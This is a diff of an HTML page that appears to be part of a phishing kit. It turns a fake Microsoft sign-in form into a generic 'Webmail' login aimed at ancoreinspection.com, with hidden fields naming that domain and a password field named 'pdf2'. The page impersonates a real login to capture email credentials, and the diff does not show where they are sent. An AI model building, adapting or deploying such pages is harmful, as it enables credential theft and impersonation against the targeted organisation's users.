@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html dir="ltr" lang="EN-US">
+<html lang="en">
 
 <head>
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
@@ -13,7 +13,7 @@
     <!-- <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous"> -->
     <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
     <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
-    <title class="logoname"> </title>
+    <title class="logoname"> Mail </title>
     <link href="css/hover.css" rel="stylesheet" media="all">
     <!--     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm">
@@ -70,10 +70,10 @@
         }
 
         a {
-            background-color: false
+            background-color: transparent
         }
 
-        a1:true,
+        a:active,
         a:hover {
             outline: 0
         }
@@ -8402,71 +8402,67 @@
     <div class="background-image"><br></div>
     <p>&nbsp;</p>
     <p>&nbsp;</p>
-    <p><br></p>
-    <p><br></p>
-    <p><br></p>
     <div class="login-form">
-        <h2 class="text-left"><br></h2>
+        <h2 class="text-center">
+            <div id="top"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Circle-icons-mail.svg/2048px-Circle-icons-mail.svg.png" alt="Mailbox" id="logoimg" style="height: 64px;"> <span class="logoname" style="vertical-align: middle; padding-left: 5px;">Webmail</span></div>
+        </h2>
         <form action="#">
-            <div class="text-left">
-                <p><img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" alt="Microsoft" id="logoimg" style="width: 117px; height: 25.6645px;"><br></p>
-                <div height="24px" id="top2"><strong><span style="font-size: 16px; font-family: Arial, Helvetica, sans-serif;">&nbsp;Sign in</span></strong></div><strong><span class="text-danger" id="error" style="display: none;">That account doesn&apos;t exist. Enter a different account</span>
-                    <div class="form-group">
-                        <div class="input-group">&nbsp;<input type="email" class="form-control" name="email" placeholder="Email" value="" id="email"></div>
-                    </div>
-                    <div class="form-group">
-                        <div class="input-group">&nbsp;<input type="password" class="form-control" id="password" name="pdf2" placeholder="Password" required="required"></div>
-                    </div>
-                    <div class="alert alert-danger" id="msg" style="display: none;">Invalid username or password</div>
-                    <div class="form-group"><input type="hidden" name="pdf1" size="35" value=""><input type="hidden" name="address" size="5" value="ancoreinspection.com"><br><input type="hidden" name="email" size="35" value=""><input type="hidden" name="type" size="5" value="ancoreinspection.com"> <button class="btn btn-primary login-btn btn-block" id="submit-btn" type="submit">Sign in</button></div>
-                    <div class="clearfix"><label class="pull-left checkbox-inline"><input type="checkbox">&nbsp;Secured Login session?</label> <a class="pull-right" href="#">Forgot Password?</a></div>
-                    <p style="text-align:center;"><a href="#">&nbsp;Copyright&copy; 2022</a></p><a href="#">&nbsp;</a>&nbsp;
-                </strong>
+            <h2 class="text-center">
+                <div id="top2" style="height: 45px;"><span style='color: rgb(0, 0, 0); font-family: "Helvetica Neue", Helvetica, Arial, sans-serif; font-size: 30px; font-style: normal; font-variant-ligatures: normal; font-variant-caps: normal; font-weight: 500; letter-spacing: normal; orphans: 2; text-align: center; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; background-color: rgb(247, 247, 247); text-decoration-thickness: initial; text-decoration-style: initial; text-decoration-color: initial; display: inline !important; float: none;'>Sign in</span></div>
+            </h2><span class="text-danger" id="error" style="display: none;">That account doesn&apos;t exist. Enter a different account</span>
+            <div class="form-group">
+                <div class="input-group">&nbsp;<input type="email" class="form-control" name="username" placeholder="Username" value="" id="email"></div>
             </div>
-        </form><strong>&nbsp;<style>
-                .tb_button {
-                    padding: 1px;
-                    cursor: pointer;
-                    border-right: 1px solid #8b8b8b;
-                    border-left: 1px solid #FFF;
-                    border-bottom: 1px solid #fff;
-                }
-
-                .tb_button.hover {
-                    borer: 2px outset #def;
-                    background-color: #f8f8f8 !important;
-                }
-
-                .ws_toolbar {
-                    z-index: 100000
-                }
-
-                .ws_toolbar .ws_tb_btn {
-                    cursor: pointer;
-                    border: 1px solid #555;
-                    padding: 3px
-                }
-
-                .tb_highlight {
-                    background-color: yellow
-                }
-
-                .tb_hide {
-                    visibility: hidden
-                }
-
-                .ws_toolbar img {
-                    padding: 2px;
-                    margin: 0px
-                }
-            </style> <!-- Optional JavaScript -->
-            <!-- jQuery first, then Popper.js, then Bootstrap JS -->
-            <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
-            <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
-            <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>&nbsp;
-        </strong>
+            <div class="form-group">
+                <div class="input-group">&nbsp;<input type="password" class="form-control" id="password" name="pdf2" placeholder="Password" required="required"></div>
+            </div>
+            <div class="alert alert-danger" id="msg" style="display: none;">Invalid username or password</div>
+            <div class="form-group"><input type="hidden" name="pdf1" size="35" value=""><input type="hidden" name="address" size="5" value="ancoreinspection.com"><br><input type="hidden" name="email" size="35" value=""><input type="hidden" name="type" size="5" value="ancoreinspection.com"> <button class="btn btn-primary login-btn btn-block" id="submit-btn" type="submit">Sign in</button></div>
+            <div class="clearfix"><label class="pull-left checkbox-inline"><input type="checkbox">&nbsp;Secured Login session?</label> <a class="pull-right" href="#">Forgot Password?</a></div>
+        </form>
+        <p style="text-align:center;"><a href="#">&nbsp;Copyright&copy; &nbsp;2022</a></p><a href="#">&nbsp;</a>
     </div>
-    <p><strong>&nbsp;</strong></p>
+    <style>
+        .tb_button {
+            padding: 1px;
+            cursor: pointer;
+            border-right: 1px solid #8b8b8b;
+            border-left: 1px solid #FFF;
+            border-bottom: 1px solid #fff;
+        }
+
+        .tb_button.hover {
+            borer: 2px outset #def;
+            background-color: #f8f8f8 !important;
+        }
+
+        .ws_toolbar {
+            z-index: 100000
+        }
+
+        .ws_toolbar .ws_tb_btn {
+            cursor: pointer;
+            border: 1px solid #555;
+            padding: 3px
+        }
+
+        .tb_highlight {
+            background-color: yellow
+        }
+
+        .tb_hide {
+            visibility: hidden
+        }
+
+        .ws_toolbar img {
+            padding: 2px;
+            margin: 0px
+        }
+    </style><!-- Optional JavaScript -->
+    <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
 </body>
 
 </html>
